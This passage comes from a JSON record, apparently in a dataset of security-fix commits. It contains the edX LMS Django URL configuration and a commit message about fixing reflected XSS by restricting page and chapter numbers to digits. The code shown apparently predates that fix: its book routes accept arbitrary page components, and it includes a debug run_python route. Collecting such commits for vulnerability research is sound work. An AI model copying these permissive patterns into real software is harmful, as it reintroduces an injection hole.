url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ", "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"}}, "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page."}, "1162dbc18fda91b07a5942873387d60fd67b2cfc": {"url": "https://api.github.com/repos/Dalas/edx/commits/1162dbc18fda91b07a5942873387d60fd67b2cfc", "html_url": "https://github.com/Dalas/edx/commit/1162dbc18fda91b07a5942873387d60fd67b2cfc", "sha": "1162dbc18fda91b07a5942873387d60fd67b2cfc", "keyword": "XSS check", "diff": "diff --git a/pavelib/paver_tests/test_paver_bok_choy_cmds.py 